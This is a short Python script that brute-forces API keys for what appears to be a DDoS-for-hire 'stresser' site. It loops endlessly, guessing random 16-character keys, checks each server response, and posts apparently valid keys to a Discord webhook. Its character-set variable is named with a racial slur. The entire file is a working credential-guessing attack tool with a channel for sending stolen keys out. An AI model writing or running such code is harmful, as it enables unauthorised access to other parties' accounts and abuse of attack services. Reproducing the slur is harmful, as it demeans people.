import requests, random
from discord import SyncWebhook

size = 16
nigger = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

def key_gen():
    return ''.join(random.choice(nigger) for _ in range(size))

while True:
    url = "https://sunstresser.net/source/api/api.php?key="
    key = url + key_gen()
    r = requests.get(key)
    if "Invalid key Specified" in r.text:
        print('[-] INVALID ' + key)
    elif "If you believe this was an error please contact the" in r.text:
        print('[-] INVALID ' + key)
    elif "ERROR" in r.text:
        webhook = SyncWebhook.from_url("")
        webhook.send(key)
        print('[+] VALID '+ key)
        continue
